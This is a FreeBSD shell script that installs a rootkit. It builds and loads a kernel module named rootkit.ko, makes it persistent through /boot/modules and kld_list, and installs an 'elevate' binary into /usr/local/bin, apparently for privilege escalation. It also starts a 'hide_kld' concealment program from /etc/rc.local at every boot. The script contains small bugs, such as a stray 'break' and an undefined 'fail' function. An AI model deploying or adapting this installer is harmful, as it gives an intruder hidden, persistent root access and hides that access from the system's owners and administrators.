#!/bin/sh

set -eu

PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)

MODULE_DIR="$PROJECT_DIR/kernel"
USERSPACE_DIR="$PROJECT_DIR/user"
PERSISTENCE_DIR="/boot/modules"

MODULE_FILE="$MODULE_DIR/rootkit.ko"
PERSISTENCE_FILE="$PERSISTENCE_DIR/rootkit.ko"

ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
ELEVATE_BIN="$USERSPACE_DIR/elevate"


# Check dependencies
for command in make kldload kldstat cc install sysrc; do
    command -v "$command" >/dev/null 2>&1
done


# Build rootkit.ko
make -C "$MODULE_DIR"
[ -f "$MODULE_FILE" ]


# Build elevate
cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"


# Ensures persistence 
install -d -m 755 "$PERSISTENCE_DIR"

install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"


# Add rootkit to kld_list without duplicating existing entries
sysrc kld_list+=rootkit >/dev/null


# Load it during the current boot
if kldstat -q -m rootkit >/dev/null 2>&1; then
    break
else
    kldload "$PERSISTENCE_FILE" ||
        fail "Failed to load $PERSISTENCE_FILE"
fi


# Check if rootkit.ko is loaded
kldstat -q -m rootkit >/dev/null 2>&1


# Verify elevate was built successfully
[ -f "$ELEVATE_BIN" ]
[ -x "$ELEVATE_BIN" ]


# Install elevate
install -d -m 755 /usr/local/bin
install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate


# Install hiding
cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"

ABS_PATH=$(realpath "$PROJECT_DIR/user/hide_kld")

if [ ! -f /etc/rc.local ]; then
    echo "#!/bin/sh" > /etc/rc.local
fi
chmod +x /etc/rc.local

echo "$ABS_PATH &" >> /etc/rc.local

"$ABS_PATH" &